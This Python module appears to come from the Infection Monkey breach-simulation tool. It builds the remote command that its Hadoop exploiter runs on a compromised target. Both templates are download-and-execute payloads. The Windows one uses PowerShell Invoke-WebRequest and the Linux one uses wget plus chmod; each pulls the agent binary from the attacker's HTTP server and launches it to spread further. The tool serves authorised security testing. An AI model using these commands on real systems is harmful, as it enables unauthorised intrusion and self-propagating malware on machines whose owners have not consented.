from typing import Sequence

from common import OperatingSystem
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.model import MONKEY_ARG, TargetHost
from infection_monkey.utils.commands import build_monkey_commandline

HADOOP_WINDOWS_COMMAND_TEMPLATE = (
    "powershell -NoLogo -Command \"if (!(Test-Path '%(monkey_path)s')) { "
    "Invoke-WebRequest -Uri '%(http_path)s' -OutFile '%(monkey_path)s' -UseBasicParsing }; "
    " if (! (ps | ? {$_.path -eq '%(monkey_path)s'})) "
    '{& %(monkey_path)s %(monkey_type)s %(parameters)s }  "'
)
# The hadoop server may request another monkey executable after the attacker's HTTP server has shut
# down. This will result in wget creating a zero-length file, which needs to be removed. Using the
# `--no-clobber` option prevents two simultaneously running wget commands from interfering with
# eachother (one will fail and the other will succeed).
#
# If wget creates a zero-length file (because it was unable to contact the attacker's HTTP server),
# it needs to remove the file. It sleeps to minimize the risk that the file was created by another
# concurrently running wget and then removes the file if it is still zero-length after the sleep.
#
# This doesn't eleminate all race conditions, but should be good enough (in the short term) for all
# practical purposes. In the future, using randomized names for the monkey binary (which is a good
# practice anyway) would eleminate most of these issues.
HADOOP_LINUX_COMMAND_TEMPLATE = (
    "wget --no-clobber -O %(monkey_path)s %(http_path)s "
    "|| sleep 5 && ( ( ! [ -s %(monkey_path)s ] ) && rm %(monkey_path)s ) "
    "; chmod +x %(monkey_path)s "
    "&&  %(monkey_path)s %(monkey_type)s %(parameters)s"
)


def build_hadoop_command(
    self,
    target_host: TargetHost,
    servers: Sequence[str],
    current_depth: int,
    agent_download_url: str,
) -> str:
    monkey_cmd = build_monkey_commandline(servers, current_depth + 1)

    if OperatingSystem.WINDOWS == target_host.operating_system:
        base_command = HADOOP_WINDOWS_COMMAND_TEMPLATE
    else:
        base_command = HADOOP_LINUX_COMMAND_TEMPLATE

    return base_command % {
        "monkey_path": get_agent_dst_path(target_host),
        "http_path": agent_download_url,
        "monkey_type": MONKEY_ARG,
        "parameters": monkey_cmd,
    }
